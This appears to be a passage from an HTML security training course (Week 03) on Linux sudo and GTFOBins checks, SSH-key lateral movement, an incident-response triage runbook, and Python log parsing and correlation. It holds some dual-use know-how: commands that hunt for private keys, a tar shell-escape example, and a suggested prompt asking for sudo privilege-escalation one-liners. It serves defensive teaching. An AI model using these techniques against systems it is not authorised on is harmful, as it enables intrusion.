+On your Linux system, run <code>sudo -l</code> to see your sudo permissions.
+Then check gtfobins.github.io for each binary you can run with sudo.
+Write a note: for each sudo entry, is it exploitable via GTFOBins? If yes, what is the exploit one-liner?
+Expected output: a list of your sudo permissions with a GTFOBins assessment for each.</p>
+<hr />
+<h3>Concept 3 — SSH Keys and Lateral Movement</h3>
+<p>SSH keys replace passwords for remote authentication. The server stores authorized public keys in <code>~/.ssh/authorized_keys</code>. An attacker who adds their public key to this file can log in without a password at any time in the future — a stealthy persistence mechanism.</p>
+<p>Lateral movement via SSH: after compromising one Linux host, an attacker looks for:</p>
+<ol>
+<li>Private keys in <code>~/.ssh/id_rsa</code> (or <code>id_ed25519</code>) — these unlock other systems</li>
+<li>SSH known_hosts files — which other hosts has this user connected to?</li>
+<li>SSH config files — credentials stored for convenience</li>
+</ol>
+<p><strong>Example:</strong></p>
+<pre><code># Find all authorized_keys files (persistence check):
+find / -name &quot;authorized_keys&quot; -type f 2&gt;/dev/null
+# For each, compare with expected authorized keys
+
+# Find private keys (look for PEM headers):
+grep -r &quot;BEGIN.*PRIVATE KEY&quot; /home /root 2&gt;/dev/null
+
+# SSH known_hosts reveals lateral movement graph:
+cat ~/.ssh/known_hosts
+# Each entry = a host this machine has connected to
+# Format: hostname,IP key_type public_key
+
+# Detect recent SSH lateral movement in auth.log:
+grep &quot;Accepted publickey&quot; /var/log/auth.log | grep -v &quot;10.0.1.&quot; \
+  | awk &#x27;{print $1, $2, $3, &quot;from:&quot;, $11, &quot;user:&quot;, $9}&#x27;
+</code></pre><p><strong>Exercise:</strong>
+Write a Python script that:</p>
+<ol>
+<li>Reads <code>~/.ssh/known_hosts</code></li>
+<li>Parses each line to extract the hostname/IP and key type</li>
+<li>Prints a table of known hosts</li>
+</ol>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from pathlib import Path
+
+known_hosts = Path.home() / &quot;.ssh&quot; / &quot;known_hosts&quot;
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output: a printed table with columns Host, KeyType for each entry in known_hosts. If known_hosts is empty, create a fake one with two entries and parse that.</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs for sudoers misconfiguration detection
+<strong>Threat:</strong> An attacker asks an LLM to generate a subtle sudoers entry that gives them privilege escalation while appearing to be a legitimate maintenance entry (e.g., <code>NOPASSWD: /usr/bin/tar</code> allows shell escape via <code>--checkpoint-action</code>).
+<strong>Opportunity:</strong> Paste your sudoers file into an LLM and ask it to identify every entry that can be abused for privilege escalation, with the specific GTFOBins technique for each. More thorough than manually checking each binary.
+<strong>Prompt to try:</strong> <code>&quot;Here is the contents of /etc/sudoers: [paste file]. For each NOPASSWD entry, check if the binary can be used for privilege escalation via GTFOBins or shell escapes. List each vulnerable entry, the exploit technique, and the one-liner to exploit it.&quot;</code></p>
+<hr />
+<h2 id="day-5">Day 5 — Linux Incident Response Toolkit</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="03-5"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=-acqlRfLL6k" target="_blank" rel="noopener"><b>Essential Linux Commands for Incident Response | SOC Analyst Toolkit</b><small>cyberninja</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=Linux%20incident%20response%20live%20forensics%20commands" target="_blank" rel="noopener">Linux incident response live forensics commands</a></p></div>
+<hr />
+<h3>Concept 1 — Triage Commands: First 10 Minutes on a Compromised Host</h3>
+<p>When you land on a potentially compromised Linux host, you need to quickly gather volatile state (memory, processes, network connections) before doing anything that might alter the system or alert the attacker. This is a structured triage runbook.</p>
+<p>Data engineering analogy: this is like the first triage steps when a production pipeline fails — you check the job status, memory usage, active queries, and logs before you start restarting services. You gather evidence first, act second.</p>
+<p><strong>Example:</strong></p>
+<pre><code># === Linux IR Triage Runbook (run as root) ===
+
+# 1. Who is currently logged in?
+w
+last -n 20
+who
+
+# 2. What processes are running?
+ps auxf                        # full process tree with forest view
+ps -eo pid,ppid,user,cmd      # PID, PPID, user, command — useful for pivot table
+
+# 3. What network connections exist?
+ss -tnp                        # TCP connections with process
+ss -unlp                       # UDP listeners
+netstat -rn                    # routing table — is traffic being redirected?
+
+# 4. What processes are listening for connections?
+ss -tlnp | grep -v &quot;127.0.0.1\|::1&quot;   # external-facing listeners only
+
+# 5. Are any processes running from deleted files?
+ls -la /proc/*/exe 2&gt;/dev/null | grep deleted
+
+# 6. What scheduled tasks exist?
+crontab -l
+cat /etc/crontab
+ls /etc/cron.d /etc/cron.daily /etc/cron.weekly
+
+# 7. Recent file modifications in sensitive dirs:
+find /tmp /var/tmp /dev/shm -newer /etc/passwd -type f 2&gt;/dev/null
+find /usr/bin /usr/sbin /bin /sbin -newer /etc/passwd -type f 2&gt;/dev/null
+
+# 8. Check loaded kernel modules (rootkits hide here):
+lsmod | grep -v &quot;^Module&quot;
+</code></pre><p><strong>Exercise:</strong>
+Run the full triage runbook above on your Linux system. For each section, note any finding that you cannot immediately explain.
+Then focus on step 7: are there any files in <code>/tmp</code> or <code>/dev/shm</code> newer than <code>/etc/passwd</code>? If yes, examine them.
+Expected output: a structured triage report with one line per section describing what you found (or &quot;nothing unexpected&quot;).</p>
+<hr />
+<h3>Concept 2 — Parsing Linux Logs with Python (Royal Road Foundation)</h3>
+<p>The W03 Royal Road artifact extends the W02 EVTX parser to support syslog and auditd formats, outputting a unified normalized schema that lets you JOIN Windows and Linux events by time and source IP.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import re
+from datetime import datetime
+
+# Syslog format: &quot;Jan 15 09:23:41 hostname process[pid]: message&quot;
+SYSLOG_RE = re.compile(
+    r&quot;^(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})\s+(\S+)\s+(\S+?)(?:\[(\d+)\])?:\s+(.*)$&quot;
+)
+
+def parse_syslog_line(line: str) -&gt; dict | None:
+    m = SYSLOG_RE.match(line.strip())
+    if not m:
+        return None
+    ts_str, host, proc, pid, msg = m.groups()
+    # Normalize to ISO 8601 (assume current year — syslog omits it)
+    try:
+        ts = datetime.strptime(ts_str, &quot;%b %d %H:%M:%S&quot;).replace(
+            year=datetime.now().year
+        )
+    except ValueError:
+        ts = None
+    return {
+        &quot;time&quot;:    ts.isoformat() if ts else ts_str,
+        &quot;host&quot;:    host,
+        &quot;process&quot;: proc,
+        &quot;pid&quot;:     pid,
+        &quot;message&quot;: msg,
+        &quot;source&quot;:  &quot;syslog&quot;,
+    }
+
+# Unified schema for BOTH Windows (W02) and Linux (W03):
+# {&quot;time&quot;: ISO8601, &quot;host&quot;: str, &quot;event_id&quot;/&quot;process&quot;: str,
+#  &quot;message&quot;: str, &quot;source&quot;: &quot;evtx&quot;|&quot;syslog&quot;|&quot;auditd&quot;, ...extra fields}
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write a Python function <code>parse_auth_log(path: str) -&gt; list[dict]</code> that:</p>
+<ol>
+<li>Reads <code>/var/log/auth.log</code> line by line using the parser above</li>
+<li>Filters for lines containing &quot;Failed password&quot; or &quot;Accepted password&quot; or &quot;sudo&quot;</li>
+<li>Returns a list of normalized dicts</li>
+</ol>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>def parse_auth_log(path: str) -&gt; list[dict]:
+    results = []
+    with open(path, encoding=&quot;utf-8&quot;, errors=&quot;replace&quot;) as f:
+        for line in f:
+            # use parse_syslog_line here
+            ...
+    return results
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output: a list of dicts for SSH and sudo events with normalized time, host, process, and message fields.</p>
+<hr />
+<h3>Concept 3 — Unified Log Schema: Joining Windows and Linux Events</h3>
+<p>The power of the Royal Road pipeline becomes clear when you can query Windows and Linux events side by side. A detection that spans both (e.g., &quot;SMB lateral movement from Windows workstation immediately followed by suspicious SSH from the same IP to a Linux server&quot;) requires a shared schema.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import json
+import pandas as pd
+from pathlib import Path
+
+def load_unified_pipeline(evtx_jsonl: str, syslog_jsonl: str) -&gt; pd.DataFrame:
+    rows = []
+    for path in [evtx_jsonl, syslog_jsonl]:
+        with open(path) as f:
+            for line in f:
+                rows.append(json.loads(line))
+    df = pd.DataFrame(rows)
+    df[&quot;time&quot;] = pd.to_datetime(df[&quot;time&quot;], errors=&quot;coerce&quot;, utc=True)
+    return df.sort_values(&quot;time&quot;)
+
+# Cross-platform detection: same IP appears in Windows 4625 (failed logon)
+# AND Linux Failed password within 5 minutes
+def detect_cross_platform_spray(df: pd.DataFrame) -&gt; pd.DataFrame:
+    win_failed = df[df.get(&quot;event_id&quot;, pd.Series()) == &quot;4625&quot;]
+    lin_failed = df[df[&quot;message&quot;].str.contains(&quot;Failed password&quot;, na=False)]
+
+    results = []
+    for _, row in win_failed.iterrows():
+        ip = row.get(&quot;IpAddress&quot;, &quot;&quot;)
+        if not ip:
+            continue
+        window_end   = row[&quot;time&quot;] + pd.Timedelta(minutes=5)
+        matching_lin = lin_failed[
+            lin_failed[&quot;message&quot;].str.contains(ip, na=False) &amp;
+            (lin_failed[&quot;time&quot;] &gt;= row[&quot;time&quot;]) &amp;
+            (lin_failed[&quot;time&quot;] &lt;= window_end)
+        ]
+        if not matching_lin.empty:
+            results.append({&quot;src_ip&quot;: ip, &quot;win_time&quot;: row[&quot;time&quot;],
+                            &quot;lin_events&quot;: len(matching_lin)})
+    return pd.DataFrame(results)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Using the unified schema above, write a function that flags any IP that:</p>
+<ol>
+<li>Appears in the Windows EVTX log with Event ID 4624 (successful logon, type 3 — network)</li>
+<li>Within 60 seconds, also appears in the Linux syslog as a new SSH connection</li>
+</ol>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>def detect_windows_then_linux_pivot(df: pd.DataFrame) -&gt; pd.DataFrame:
+    # Filter for Windows successful network logons
+    win_logons = df[
+        (df.get(&quot;event_id&quot;, pd.Series()) == &quot;4624&quot;) &amp;
+        (df.get(&quot;LogonType&quot;, pd.Series()) == &quot;3&quot;)
+    ]
+    # Filter for Linux SSH accepted connections
+    lin_ssh = df[df[&quot;message&quot;].str.contains(&quot;Accepted&quot;, na=False)]
+    # Return rows where the same IP appears in both within 60 seconds
+    ...
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output: a DataFrame of pivot candidates with src_ip, win_time, lin_time, and time_delta_seconds.</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs for cross-platform log correlation
+<strong>Threat:</strong> An attacker deliberately generates high volumes of benign log noise on both Windows and Linux systems to overwhelm LLM-based triage tools with false positive candidates, causing alert fatigue and hiding the real attack sequence.
+<strong>Opportunity:</strong> Feed a time-ordered sequence of cross-platform events for a specific IP address to an LLM and ask it to reconstruct the attacker's actions as a narrative. The LLM can identify the attack chain across Windows and Linux events that individual rule-based detections would miss.
+<strong>Prompt to try:</strong> <code>&quot;Here is a time-ordered sequence of Windows and Linux log events from the same source IP 10.0.2.99 over a 10-minute window: [paste events]. Reconstruct what the attacker was doing step by step. Identify the technique (MITRE ATT&amp;CK TTP) for each action.&quot;</code></p>
+<hr />
+<h2>Royal Road Standard — Week 03</h2>
+<p><strong>Task:</strong> Extend the pipeline to support Linux logs. Add <code>pipeline/w03_syslog_parser.py</code> and a unified loader that merges W02 EVTX output with W03 syslog/auditd output into a single DataFrame.</p>
+<p><strong>Builds on:</strong> W02 <code>pipeline/w02_evtx_parser.py</code> — both parsers write the same normalized JSON Lines schema, enabling a single <code>pd.read_json(..., lines=True)</code> call to load both.</p>
+<p><strong>Deliverable:</strong> <code>pipeline/w03_syslog_parser.py</code> that:</p>
+<ul>
+<li>Accepts an auth.log or syslog file path as CLI argument</li>
+<li>Optionally accepts an auditd log path via <code>--auditd &lt;path&gt;</code></li>
+<li>Parses all events into the unified schema: <code>{time, host, process, pid, message, source}</code></li>
+<li>Writes a <code>.jsonl</code> output file</li>
+<li>Prints summary: <code>Parsed N syslog events + M auditd events → output.jsonl</code></li>
+</ul>
+<p>Plus <code>pipeline/load_unified.py</code>:</p>
+<ul>
+<li>Accepts multiple <code>.jsonl</code> paths (W02 + W03 outputs)</li>
+<li>Loads all into a single DataFrame sorted by time</li>
+<li>Prints: <code>Loaded N total events from X sources</code></li>
+</ul>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># pipeline/w03_syslog_parser.py
+import sys
+import json
+import re
+import argparse
+from pathlib import Path
+from datetime import datetime
+
+def parse_syslog_line(line: str) -&gt; dict | None:
+    ...
+
+def parse_auditd_log(path: Path) -&gt; list[dict]:
+    ...
+
+if __name__ == &quot;__main__&quot;:
+    parser = argparse.ArgumentParser()
+    parser.add_argument(&quot;syslog&quot;)
+    parser.add_argument(&quot;--auditd&quot;)
+    args = parser.parse_args()
+    ...
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Stretch goal:</strong> Add a <code>--detect-spray</code> flag that runs the cross-platform password spray detection (Day 5 Concept 3) across all loaded <code>.jsonl</code> files and prints any detected source IPs.</p>
+<div class="pager"><a class="btn ghost" href="week-02.html">&larr; Week 02</a><a class="btn ghost" href="week-04.html">Week 04 &rarr;</a></div>
+</main></body></html>
